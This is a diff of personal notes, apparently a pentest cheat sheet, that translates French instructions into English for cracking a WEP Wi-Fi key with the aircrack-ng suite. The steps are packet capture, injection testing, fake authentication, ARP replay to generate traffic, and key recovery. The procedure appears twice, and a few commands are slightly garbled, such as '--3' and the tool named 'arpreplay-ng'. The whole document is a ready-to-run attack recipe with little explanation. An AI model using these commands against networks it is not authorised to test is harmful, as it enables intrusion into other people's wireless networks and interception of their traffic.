@@ -1,41 +1,80 @@
-1- Carte en mode monitor
+1. Put the wireless card in Monitor mode.
 
-2- Verification des points d'acces
-sudo airodump-ng wlan0mon
+2. Access point verification.
+$ sudo airodump-ng wlan0
+>>> note the BSSID MAC: MAC of the access point.
+>>> note the ESSID:     name of the access point.
 
-3- Demarrage airodump pour ecriture fichier (WEP)
-$ sudo airodump-ng wlan0mon --channel <ch> -w WEP
+3. Packets recording with airodump-ng.
+$ sudo airodump-ng wlan0 --channel <ch> -w WEP
 
-4- Lancement test d'injection
-$ aireplay-ng -9 -a <MAC BSSID> wlan0mon
->>> observation des paquets.
+4. Injection test with aireplay-ng. 
+Test the connectivity between the network card and the access point.
+Use '-9' or '--test'.
+$ aireplay-ng -9 -a <BSSID MAC> wlan0
+>>> observe thr result.
 
-ou 
+5. Performs a fake authentication.
+Accelerate the number of authentication.
+Use '-1' or '--fakeauth'.
+$ sudo aireplay-ng -1 0 -e <ESSID> -a <BSSID MAC> -h <kali MAC> wlan0
+>>> -1 0 : do the fake just one time.
+>>> authentification to the acces point. The acces point accepts 
+    our MAC address and will listen our packets.
 
-$ sudo aireplay-ng -1 0 -e <ESSID> -a <MAC BSSID> -h <MAC kali> wlan0mon
->>> authentification aupres du point d'acces.
-$ sudo aireplay-ng --arpreplay -b <MAC BSSID> -h <MAC kali> wlan0mon
->>> augmentation du trafic.
+6. Replay an ARP packet wth arpreplay-ng.
+After finding an ARP packet, arpreplay-ng send it to the access point then
+  the acces point to the machines (normal functionning).
+Use '-3' or '--arpreplay'.
+$ sudo aireplay-ng --3 -b <BSSID MAC> -h <kali MAC> wlan0
+>>> traffic augmentation.
 
-5- Lancement du crack
+7. Stop the airodump-ng recorder (see 3.).
+Use Ctrl-C.
+
+8. Try to find the Key into previously recorded packet (see 3.).
 $ sudo aircrack-ng WEP-01.cap
 
 >@
->@##############################################################
+>@##############################################################################
 >@
->@* Mode monitor
+>@1. Put the wireless card in Monitor mode.
 >@
->@* Airodump en ecriture 
->@$ sudo airodump-ng wlan0mon --channel <ch> -W WEP
+>@2. Access point verification.
+>@$ sudo airodump-ng wlan0
+>@>>> note the BSSID MAC: MAC of the access point.
+>@>>> note the ESSID:     name of the access point.
 >@
->@* Trafic
->@$ sudo aireplay-ng -1 0 -e <ESSID> -a <MAC BSSID> -h <MAC kali> wlan0mon
->@$ sudo aireplay-ng --arpreplay -b <MAC BSSID> -h <MAC kali> wlan0mon
+>@3. Packets recording with airodump-ng.
+>@$ sudo airodump-ng wlan0 --channel <ch> -w WEP
 >@
->@* Crack
-$ sudo aircrack-ng WEP-01.cap -b <MAC BSSID>
+>@4. Injection test with aireplay-ng. 
+>@Test the connectivity between the network card and the access point.
+>@Use '-9' or '--test'.
+>@$ aireplay-ng -9 -a <BSSID MAC> wlan0
+>@>>> observe thr result.
 >@
->@##############################################################
+>@5. Performs a fake authentication.
+>@Accelerate the number of authentication.
+>@Use '-1' or '--fakeauth'.
+>@$ sudo aireplay-ng -1 0 -e <ESSID> -a <BSSID MAC> -h <kali MAC> wlan0
+>@>>> -1 0 : do the fake just one time.
+>@>>> authentification to the acces point. The acces point accepts 
+>@    our MAC address and will listen our packets.
 >@
+>@6. Replay an ARP packet wth arpreplay-ng.
+>@After finding an ARP packet, arpreplay-ng send it to the access point then
+>@  the acces point to the machines (normal functionning).
+>@Use '-3' or '--arpreplay'.
+>@$ sudo aireplay-ng --3 -b <BSSID MAC> -h <kali MAC> wlan0
+>@>>> traffic augmentation.
+>@
+>@7. Stop the airodump-ng recorder (see 3.).
+>@Use Ctrl-C.
+>@
+>@8. Try to find the Key into previously recorded packet (see 3.).
+>@$ sudo aircrack-ng WEP-01.cap
+>@
+>@##############################################################################
 >@
 
